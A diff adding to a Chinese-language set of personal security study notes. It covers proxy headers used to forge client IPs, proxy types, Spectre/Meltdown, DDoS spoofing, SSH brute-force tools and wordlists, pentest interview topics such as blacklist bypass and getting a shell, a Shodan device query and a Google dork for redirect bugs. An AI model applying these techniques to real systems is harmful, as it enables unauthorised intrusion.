+        - 用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 请求头字段
+        - [wikipedia](https://zh.wikipedia.org/wiki/X-Forwarded-For)
+        - [What is the difference between X-Forwarded-For and X-Forwarded-IP?](https://stackoverflow.com/questions/19366090/what-is-the-difference-between-x-forwarded-for-and-x-forwarded-ip)
+            + `X-Forwarded-IP` is the conventional way of identifying the originating IP address of the user connecting to the __email__ server through an HTTP mail service.
+        - `X-Forwarded-For` 和 `X-Real-IP`
+            + [HTTP 请求头中的 X-Forwarded-For](https://imququ.com/post/x-forwarded-for-header-in-http.html)
+            + [X-Forwarded-For 和 X-Real-IP 的区别？](https://segmentfault.com/q/1010000002409659)
+        - 很多很乱(伪造 IP 的几种方式)
+            + `X-Client-IP`
+            + `X-Remote-IP`
+            + `X-Remote-Address`
+            + `X-Originating-IP`
+            + `X-Forwarded-For`
+        - 还有好多, [What is the most accurate way to retrieve a user's correct IP address in PHP?](https://stackoverflow.com/questions/1634782/what-is-the-most-accurate-way-to-retrieve-a-users-correct-ip-address-in-php)
+            + `HTTP_CLIENT_IP`
+            + `HTTP_X_FORWARDED_FOR`
+            + `HTTP_X_FORWARDED`
+            + `HTTP_X_CLUSTER_CLIENT_IP`
+            + `HTTP_FORWARDED_FOR`
+            + `HTTP_FORWARDED`
+            + `REMOTE_ADDR`
++ 正向代理是代理客户端，为客户端收发请求，使真实客户端对服务器不可见；而反向代理是代理服务器端，为服务器收发请求，使真实服务器对客户端不可见。前向代理作为一个媒介将互联网上获取的资源返回给相关联的客户端，而反向代理是在服务器端（如Web服务器）作为代理使用，而不是客户端。
+    * 正向代理(Forward Proxy)
+        - 访问本无法访问的服务器B
+        - 隐藏访问者的行踪
+        - 加速访问服务器B
+            + 假设用户A到服务器B，经过R1路由器和R2路由器，而R1到R2路由器的链路是一个低带宽链路。而用户A到代理服务器Z，从代理服务器Z到服务器B都是高带宽链路。那么很显然就可以加速访问服务器B了。
+        - Cache 作用
+            + 不光是正向代理，反向代理也使用了Cache（缓存）技术
+                * 如果在用户A访问服务器B某数据J之前，已经有人通过代理服务器Z访问过服务器B上得数据J，那么代理服务器Z会把数据J保存一段时间
+        - 客户端访问授权
+    * 反向代理主要有以下几种作用
+        - 安全过滤
+            + 为了安全，不允许用户直接接触真实服务器
+        - 内容缓存
+            + 反向代理服务器把一些常用的内容都缓存到自己身上
+        - 负载均衡
+    * 透明代理
+        - 透明代理比较类似正向代理的功能，差别在于客户端根本不知道代理的存在，它改编你的 prequest，并会传送真实IP（使用场景就是公司限制网络的访问）。
++ Spectre & Meltdown
+    * Meltdown解决这个问题所需要的软件补丁可能会使计算机运行速度下降30%。
+        - 只影响英特尔芯片
+        - 破坏了位于用户和操作系统之间的基本隔离
+            + 允许程序访问内存，因此其他程序以及操作系统的敏感信息会被窃取。这个漏洞“熔化”了由硬件来实现的安全边界。允许低权限用户级别的应用程序“越界”访问系统级的内存，从而造成数据泄露。
+    * Spectre没有简单的解决方案，可许要重新设计处理器
+        - 影响 Intel、AMD 和 ARM 处理器，还可以通过隐藏在网页上的 JavaScript 代码进行远程利用。
+        - 漏洞Meltdown（熔毁）因“融化”了硬件的安全边界而得名\漏洞Spectre（幽灵）因其手段的隐蔽性而得名
+        - 破坏了不同应用程序之间的隔离
+            + 问题的根源在于推测执行（speculative execution），这是一种优化技术，处理器会推测在未来有用的数据并执行计算。这种技术的目的在于提前准备好计算结果，当这些数据被需要时可立即使用。在此过程中，英特尔没有很好地将低权限的应用程序与访问内核内存分开，这意味着攻击者可以使用恶意应用程序来获取应该被隔离的私有数据。
+                * 分支预测、乱序执行、边信道攻击缓存
+                * “污染”猜测过程
+    * Meltdown PoC
+        - 监视实时密码输入过程
+        - 泄露物理内存内容
+        - 从内存中重构图片
+        - 从内存中重构使用FLIF加密的图片
++ DDoS
+    * syn flood，dns flood 之类无连接攻击，源ip可以伪造的，少数几个攻击机器可以伪造无数的源ip。
+    * cc类连接攻击，可以通过代理服务器进行，依旧是少数攻击ip表现成无数的攻击源。
++ [SSH密码暴力破解](http://www.freebuf.com/sectool/159488.html)
+    * tools
+        - hydra
+        - medusa
+        - patator
+        - brutespray
+        - msf
+    * dict
+        - root & 中国姓名top1000
+        - top 10000 password & 社工
++ 笔面试
+    * 长亭科技 渗透测试
+        - 命令注入
+        - __反正向代理__
+            + 正向代理
+                * reGeorg
+            + 反向代理
+                * ssh
+        - burp
+        - 水平权限、垂直权限
+        - 修改密码验证码
+            + 越权
+            + 垃圾短信
+            + 验证修改密码先后顺序
+            + 验证应放在后台
+        - __SSRF__
+        - CSRF
+        - whoami 黑名单
+            + 变量拼接
+        - shell
+            + msf
+            + ssh
+            + netcat
+        - 流程
+        - 子域名
+        - 脆弱服务
+        - ban 内网 ip
+            + 通过外网服务器 + 302资源临时重定向跳转 访问
+        - __redis__
+        - sql 报错
+    * 唯品会广州
+        - 安服/渗透
+            + 经历/挖的洞
+            + 审计
+            + sql 防范
+            + 最近比较大的漏洞
+    * 拼多多上海
+        - 安全工程师
+            + Web安全、主机安全，深入理解相关框架和系统；
+            + 信息安全领域的技术，有丰富实战经验；
+            + 安全攻击和防御相关技术；
+        - 安全研发工程师
+            + 要求
+                * 对操作系统原理熟悉，对Linux或Windows系统有深入了解，有Linux或Windows系统研发经验；
+                * 熟悉计算机网络，对通信相关的机制有所了解；
+                * Java/C/C++/Python/Go等等；
+                * 常用算法和数据结构，熟悉网络编程、多线程编程技术 ；
+                * MySQL、Redis等数据存储系统 ；
+                * plus
+                    - 安全产品研发背景；
+                    - 运维
+                    - 漏洞分析，漏洞检测，漏洞利用
+                    - docker
+            + 一面
+                * python 多线程
+                * python 高并发
+                * c++ static
+                * 汇编 栈？
+                * 调用约定
+    * 腾讯成都
+        - 熟悉C/C++，熟悉多进程编程和进程间通讯
+        - 熟悉tcp/ip协议，熟悉Python/lua等至少一门脚本语言
+        - 熟悉arm汇编语言和指令集，熟悉使用Windows/Android平台调试工具优先，具备二进制、android ndk程序的逆向调试能力者优先
+        - 有PHP开发经验，熟悉javascript/css/html者优先
+    * 微博北京
+        - 熟悉渗透测试、常见安全工具原理
+        - 熟练使用常见安全工具及其原理 
+        - 精通常见的Web安全漏洞及原理
+        - php/python/perl/shell/java
+        - 熟悉分布式系统，有相关开发经验者优先
+* 简单 python server 挂文件/监听请求
+    - `python -m SimpleHTTPServer 8080` 
+* banner 反查设备
+    - `https://www.shodan.io/search?query=Server%3A+Linux%2C+HTTP%2F1.1%2C+DIR-815`
+* [SRC通杀技养成记之信息收集大法](https://bbs.ichunqiu.com/article-1251-1.html)
+    * URL重定向漏洞
+        ```
+        site:xxx.com inurl:go|return|returnTo|logout|register|login|returnUrl|path|redirectURI|redir|returl
+        ```
+    * Teemo搜集信息
++ [我眼中的渗透测试信息搜集](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=16020&highlight=%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)
